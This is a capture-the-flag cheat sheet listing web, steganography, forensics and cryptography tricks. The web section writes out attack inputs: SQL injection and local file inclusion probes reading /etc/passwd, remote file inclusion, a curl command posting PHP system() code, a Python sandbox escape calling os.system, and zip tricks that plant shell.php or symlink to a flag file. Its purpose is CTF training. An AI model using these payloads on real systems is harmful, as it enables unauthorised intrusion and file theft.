# CTF Candy

My goal of this repository is to create a good and up to date cheat sheet for Capture the flag events and computer security.

The one thing I hate the most is when I try a lot of different things and forgot about a simple one. This is what I aim to change!

I will also try to update this repository frequently. Pull requests are welcome

## Web
Web challenges can often by tricky. Sometimes you have no clue what to do.
A good recommendation is try to find stuff that is out of the ordinary.

*Useful tools to begin with*

* ZAP
* Burpsuite
* Python with requests lib


#### Injection in GET parameter
Here you have to manually try to enter some stuff to understand more about the application.

* `?id='`
        Test for SQL injection

* `?page[]=`
        Send an array, this might crash or reveal debug information about the error. Sometimes you might even get the source code of the application.

* `?id=-1`
        Try negative numbers

* `?id=99999999999999999999999999` or `?id=-999999999999999999999999`
        Try both positive and negative numbers

* `?page=....//....//....//....//etc/passwd`
        This might sometimes work if the application removes ../ from the url.

* `?page=../../../../etc/passwd`
        Local file inclusion (LFI)

* `?page=../html/index`
        Test for limited local file inclusion.
    The code could look like this in php:
    ```php
    <?php
        include $_GET['page'] . '.php';
    ```

* `?page=http://remote-file.js`
        Remote file inclusion

* `?page=%252e%252e%252fetc%252fpasswd`
        Double encoding + LFI

* `$ curl -d "<?=system('ls .')" -X POST http://URL/?magic=php://input`
        Send a arbitrary payload through a post request

* `Big payload size`
        This will often lead to a 500 internal error message, and might sometimes reveal information about the application and/or webserver.

* `?exec=5*5`

    If it returns *25* we have  `command injection`.
    Backend is probably running: `eval($_GET['exec'])`



#### Form data

* `Hidden form field` - If you find something like this, throw everything you got at the debug parameter, this is often a simple command injection.
    ```html
    <input type="hidden" name ="debug" />
    ```



#### Python sandbox escape

(This section is incomplete)

* `locals()`
* `dir()`
* `input()` - In python 2, this is basically eval()

* `__import__("os").system("ls .")`


* Single quote and double quotes blocked? Use only numbers and parentheses.
        ```python
        def convertstr(payload):
            output = ""
            for i in payload:
                output+= "chr(%d)+" % ord(i)
            return output[:-1]
        ```

#### Page source
The source of the page often includes hints where to look. Use developer tools!

* Commented out links
    ```html
    <!-- <a href="Secret/admin.html"></a> -->
    ```
* Keywords in comments - Try adding `?debug=1` or `?debug=true` to the url.
    ```
    <!-- debug -->
    ```


#### File upload

* https://www.owasp.org/index.php/Unrestricted_File_Upload
* What kind of extensions does the website allow?
* Can you find the url of the uploaded file?
* Double extension `.png.php`?
* `command injecton` in filename?
* Try append PHP code at the end of an image
* Spoof mime type of image?

Automatic archive unzipping:

* Can you upload a symbolic link inside a ZIP?
        ```bash
        $ ln -s ../../flag.txt test.txt
        $ zip --symlinks symbolic.zip test.txt
        ```
* Directory traversal by uploading a relative file?
        ```bash
        $ zip payload.zip ../../../shell.php
        ```

#### Money transfer
        These are often a `timing attack/side channel attack`

#### Other

* Clues in the name/title of the challenges

* Clues in the description of the challenge

* /robots.txt

* Append `?debug=1` or `?is_debug=1` to the url

        This will sometimes give you the source code of the page.
        You should test the code locally. Or some parts of the code that you do not understand. Your goal is to understand how to circumvent each layer of the challenge.

* Interesting headers sent by the application

* Cookies

* PHP Version?

* Apache/nginx version?

* Nullbyte
        PHP Version < 5.3.4

* LFI / RFI (PHP Wrappers)
        I recommend this page from [rawsec](https://rawsec.ml/en/local-file-inclusion-remote-code-execution-vulnerability/)

#### Well.. I've found nothing

If you have not found something by now. You may want to run a fuzzer.

1. Grab yourself a good [fuzz.txt](https://github.com/Bo0oM/fuzz.txt)

Use your favorite `fuzzer`. Here are some good ones:

* dirb

* dirbuster


## Esoteric Languages (ESO Lang)
* Wiki: https://esolangs.org/wiki/language_list

        Esoteric programming languages wiki! Great resource

* Interpreter: https://tio.run/

        "Tio is a online interpreters for an evergrowing list of practical and recreational programming languages."

* Hello world: [https://esolangs.org/wiki/Hello_world](https://esolangs.org/wiki/Hello_world_program_in_esoteric_languages)

        This is a good resource to find examples of a lot of esoteric languages. Take a lot here and see if one looks like the cipher text you got.

#### Variants of esolangs
* [Ook]()

        Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
        Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook.

    Could also be written without the Ook
        . ? . . . . . ! .

## Steganography

* `strings` - Look for clues in strings.

* `exiftool` - Check metadata

* `file` - What file(s) are we working with? Sometimes the extension is not the correct one. Always worth checking

* `stegsolve.jar` - Awesome stegnography tool, java based.

    ```bash
    $ java -jar stegsolve.jar
    ```

* `stegdetect` - Detect stegnography

* `zsteg` - LSB stegnography
    
    ```bash
    $ zsteg -a bojack.png 
    b1,g,lsb,xy         .. file: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, baseline, precision 8, 182x268, frames 
    ...
    $ zsteg -E b1,g,lsb,xy bojack.png > output.jpg
    ```

* `Increase height and width of image`


### Other tools

* Steghide

* [StegoMagic](https://github.com/MrMugiwara/StegoMagic)

* StegCracker

* openstego

* stegoVeritas

* stegbreak

* jsteg

* jstego

* gimp

* Outguess

* steganabara

* stegspy

* photoshop
        Make sure you zoom and check every pixel. Sometimes it's hidden in plain sight.
* zbarimg (QR Code)
        Usage: zbarimg image.png

* cloackedpixel

* LSBSteg

* f5

### Audio Steganography

* [DTFM Tones](http://dialabc.com/sound/detect/index.html)

* SONIC Visualizer

* [SSTV](http://users.belgacom.net/hamradio/rxsstv.htm)

* mp3stego

* spectrology

### Other techniques

* Reverse image search for original images
* XOR original image
* compare original.png challenge.png diff.png

### What to look out for

    * Anomalies
    * Repetitive patterns
    * Positive and negative numbers could be binary (0, 1).
    * Binary code could be morse code
    * Morse code
        - Also check for nonstandard delimiter


## JPEG forensics

* `identify chall.jpg`

* `jhead chall.jpg`

* `jpeginfo chall.jpg`

* `rdjpgcom -verbose chall.jpg`

## PNG Forensics

* pngcheck

        pngcheck -vt7f image.png

* pngcsum

    If you have a corrupt png (CRC32 checksum for example) this tool can fix it without having to open a hexeditor.

        pngcsum broken.png new.png

* pngcrush

* pngchunks

        Usage: pngchunks chall.png

* pngfix

        Usage: pngfix chall.png


* pnginfo

        Usage: pnginfo chall.png

* pngsplit

        Usage:  pngsplit chall.png

#### The Animated Portable Network Graphics (APNG) file format

* [APNG Disassembler 2.9](http://apngdis.sourceforge.net)

        Usage: apngdis anim.png [name]

* [TweakPNG](http://entropymine.com/jason/tweakpng/)

    ![alt text](images/tweakpng.png "Piet")

        Usage: wine tweakpng.exe


# Cryptography

* Old phone keypad

    ![alt text](images/phone.jpg "Keypad old phone")

* [Keyboard shift decoder](https://www.dcode.fr/keyboard-shift-cipher)

        gwkki -> hello (shift one key to the right)

* Bit shifted characters

        ord("A") = 65
        65 << 1 = 130 (encode)
        130 >> 1 = 65 (decode)

* Reverse text

        $ echo "dlrow olleh" | rev
        hello world
* [254caesar](https://github.com/flawwan/254caesar)

        echo -n "String to shift" | ./caesar

* [QuipQuip](https://quipqiup.com/)

        Sometimes you can get lucky with Quip and recover parts or even the complete flag.
        Tips:
        - Use CLUES
        - Try all modes

## Forensics

* strings

    Running strings on a binary can often reaval the flag. Use in conjunction with grep
        $ strings binary | grep "CTF_CHALL"
        $ strings binary | grep `echo -n "CTF_CHALL" | base64`

* exiftool


# Magic bytes

| Type        |  Recognize      | Signature  |
| ------------- |:-------------:| ----------:|
| EXE           |   MZ        |  4D 5A      |
| GIF           |   GIF87a        |  47 49 46 38 37 61|
| GIF           |   GIF89a        |  47 49 46 38 39 61      |
| JPG           |   ÿØÿà..JFIF..  |  FF D8 FF E0 00 10 4A 46 49 46 00 01       |
| PNG           |   .PNG....        | 89 50 4E 47 0D 0A 1A 0A      |
| PDF           |   %PDF-        |  25 50 44 46 2d     |
| 7z            |   7z¼¯'        |  37 7A BC AF 27 1C      |

## Other (Unsorted, todo)

* Samba tool [pdbedit](https://www.samba.org/samba/docs/current/man-html/pdbedit.8.html)

* [impacket](https://github.com/SecureAuthCorp/impacket)

* [any.run](https://app.any.run/)

* [ViperMonkey](https://github.com/decalage2/ViperMonkey)

* [oletools](https://github.com/decalage2/oletools)

* /dev/random - Might sometimes return nullbyte(\00)

* Shell in another challenge? Use it for recon

* https://blog.sheddow.xyz/css-timing-attack/

* MQTT

* http://libcdb.com/

* https://github.com/david942j/one_gadget

* https://blog.sheddow.xyz/css-timing-attack/

* https://github.com/ChrisTheCoolHut/PinCTF

* pwn template

* https://github.com/BuddhaLabs/PacketStorm-Exploits/blob/master/0101-exploits/unicode_shell.pl

Sources of inspiration:
* https://github.com/JohnHammond/ctf-katana/blob/master/README.md
* https://github.com/USCGA/tools
* https://ctftime.org/writeup/12243
* https://github.com/DominicBreuker/stego-toolkit#tools
* https://en.wikipedia.org/wiki/List_of_file_signatures
